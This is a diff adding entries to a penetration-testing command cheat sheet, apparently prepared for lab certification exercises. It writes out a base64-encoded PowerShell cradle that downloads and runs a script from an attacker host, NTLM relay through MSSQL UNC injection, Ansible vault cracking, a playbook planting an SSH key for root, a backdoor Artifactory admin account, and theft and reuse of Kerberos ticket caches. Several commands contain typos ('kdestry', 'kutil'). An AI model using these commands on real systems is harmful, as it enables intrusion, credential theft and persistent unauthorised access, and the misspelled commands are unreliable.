@@ -12,6 +12,15 @@ gcc --static -o ...
 sudo apt-get install gcc-multilib -y
 gcc smt.c -o smt -m32
 
+===Base64 encoding===
+===pwsh (utf-161e)
+python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.45.151/run.txt\\') | IEX'.encode('utf-16le')).decode())"
+
+$text = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.151/run.txt') | IEX"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
+$EncodedText = [Convert]::ToBase64String($bytes)
+$EncodedText
+
 ================================================================================
 ===crack converters===
 ===shadow & passwd
@@ -24,6 +33,8 @@ ssh2john id_rsa > crack
 keepass2john database.kdbx > crack
 ===zip
 zip2john file.zip > crack
+===ansible
+ansible2john ans.vault > crack (copy from $ANSIBLE_VAULT, remove all white space at front of new line)
 
 ===hashcat===
 hashcat -m <hash-mode-id> <file-of-hashes> <wordlist> -r <ruleset> —force 
@@ -32,6 +43,7 @@ hashcat -m <hash-mode-id> <file-of-hashes> <wordlist> -r <ruleset> —force
 #keberoasting:13100
 #mscache: 2100 format: ($DCC2$10240#username#hash)
 	hashcat -m2100 "\$DCC2\$10240#web_svc#130379745455ae62bbf41faa0572f6d3" ...
+#ansible: 16900
 ================================================================================
 ===File Transfers===
 ===nc
@@ -105,7 +117,6 @@ curl -k https://
 wget http://target.pg/resource.txt [-o output.txt]
 #Recursive download (only the current directory)
 wget -r -np http://target.pg/resource/
-
 
 
 ===SSH===
@@ -221,7 +232,24 @@ select sys_exec('chmod u+s /bin/bash');
 same as linux, use dll instead of so
 
 ===mssql===
+===Enumeration
+C:\> setspn -T corp1 -Q MSSQLSvc/*
+. .\GetUserSPNs.ps1
 impacket-mssqlclient -port 1433 domain.com/username:password@target.com -window
+
+===UNC Injection
+1. start smb server: sudo responder -I
+2. List smb share from target: xp_dirtree \\$LHOST\kali
+
+===Relay attacks
+1. b64 Encode pwsh payload
+python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://$LHOST/run.txt\\') | IEX'.encode('utf-16le')).decode())"
+
+2. NtlmRelayx Listener
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t $LHOST -c 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIANQAxAC4AMQA1ADEALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA='
+
+3. UNC Injection to force NTLM authentication + Hash Relay Authentication + command execution
+xp_dirtree \\$LHOST\kali
 
 ===webdav-server===
 wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/xxx/webdav/
@@ -483,6 +511,9 @@ nxc winrm target.com -u user -p password -x whoami
 ===ldap
 #dumping LAPS password
 nxc ldap target.pg -u user -p pass --kdcHost dc01.oscp -M laps
+===authenticate with ticket
+nxc smb ... --use-kcache # KRB5CCNAME is set
+nxc smb ... --use-kcache --kcache-file /path/to/ticket.ccache
 
 ===LDAP===
 ===ldapsearch
@@ -490,6 +521,9 @@ nxc ldap target.pg -u user -p pass --kdcHost dc01.oscp -M laps
 ldapsearch -x -H ldap://$TARGET -s base namingcontexts
 #anonymous query
 ldapsearch -x -H ldap://$TARGET -b "dc=hutch,dc=offsec"
+#use kerberos authentication
+ldapsearch -Y GSSAPI -x -H ldap://$TARGET -b "dc=hutch,dc=offsec"
+
 
 ===Username Enumeration===
 ===kerbrute
@@ -497,7 +531,13 @@ ldapsearch -x -H ldap://$TARGET -b "dc=hutch,dc=offsec"
 ===ldap
 ldapsearch -x -H ldap://$TARGET -b "dc=hutch,dc=offsec" | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}'
 ===GetADUsers (with credentials)
+#use creds
 impacket-GetADUsers -all -dc-ip dc01.ip domain.oscp/username:Password
+#use ticket
+impacket-GetADUsers -all -k -no-pass -dc-ip dc01.corp1.com CORP1.COM/Administrator
+===GetAUserSPNS
+#use ticket
+impacket-GetUSerSPNs -k -no-pass -dc-ip dc01.ip CORP1.COM/Administrator
 
 ===GetNPUsers
 #Check for disabled pre-auth
@@ -631,6 +671,9 @@ current_user ALL=(ALL) NOPASSWD: ALL
 openssl passwd -1 -salt <newsalt> <newpassword> 
 #Append to /etc/shadow
 <new-user>:<hash>:0:0:root:/root:/bin/bash
+
+
+
 
 
 ================================WINDOWS PE=====================================
@@ -981,6 +1024,110 @@ mimikatz # sekurlsa::pth /user:admin /domain:corp1 /ntlm:2892D26CDF84D7A70E2EB3B
 2. Shell to target PS C:\Windows\system32> Enter-PSSession -Computer appsrv01
 3. Enable ResAdmin: [appsrv01]: PS C:\Users\admin\Documents> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
 
+===Ansible
+#Ad-Hoc commands
+ansible <group> -a "whoami"
+ansible <group> -a "whoami" --become <user> (default root)
+
+#Vault
+1. Copy out encrypted vault value from $ANSIBLE_VAULT -> ansible.hash
+2. ansible2john ansible.hash > ansible.crack
+3. hashcat ansible.crack --force -m 16900 /wls/rockyou.txt (remove pre-pended *: from john output)
+4. cat ansible.crack | ansible-vault decrypt -> input password
+
+#Playbooks
+ansible-playbook playbook.yml
+
+#Writing to Playbook
+    - name: Create a directory if it does not exist
+      file:
+        path: /root/.ssh
+        state: directory
+        mode: '0700'
+        owner: root
+        group: root
+
+    - name: Create authorized keys if it does not exist
+      file:
+        path: /root/.ssh/authorized_keys
+        state: touch
+        mode: '0600'
+        owner: root
+        group: root
+
+    - name: Update keys
+      lineinfile:
+        path: /root/.ssh/authorized_keys
+        line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
+        insertbefore: EOF
+
+    - name: Run command
+      shell: touch /tmp/mycreatedfile.txt
+      async: 10
+      poll: 0
+
+
+===Artifactory
+
+#Compromising Database 
+##Copy out db
+sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
+##Use derby tool
+sudo java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
+##connect to db
+ij> connect 'jdbc:derby:/tmp/hackeddb/derby'; 
+ij> select * from access_users
+#Copy out hash(bcrypt) & crack directly with john
+
+
+#Adding 2nd admin account (need to be root)
+sudo echo "haxmin@*=haxhaxhax" > /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
+sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
+sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
+sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
+##verify
+sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log 
+
+===Kerberos on Linux
+#Find Requested ticket path
+env | grep KRB5CCNAME
+
+#Acquire TGT
+kinit
+
+#Renew tickets (if within renewal time frame)
+kinit -R
+
+#Acquire TGT with keytab
+kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
+
+#list tickets
+klist
+
+#List SPNs (force kerberos authentication)
+ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
+
+#Request service ticket
+kvno <servicePrincipalName>
+kvno MSSQLSvc/DC01.corp1.com:1433
+
+#Interactive prompt
+kutil
+##add entry to keytab
+kutil: addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
+##specify where keytab should be written
+kutil: wkt /tmp/administrator.keytab
+
+#Find ccache files
+ls -la /tmp/krb55cc_*
+#Copy out ccache and modify perms
+sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
+sudo chown offsec:offsec /tmp/krb5cc_minenow
+#Use ccache
+##clear old creds
+kdestry
+##load ccache
+export KRB5CCNAME=/tmp/krb5cc_minenow
 
 ==================================================================================
 ===Windows new user
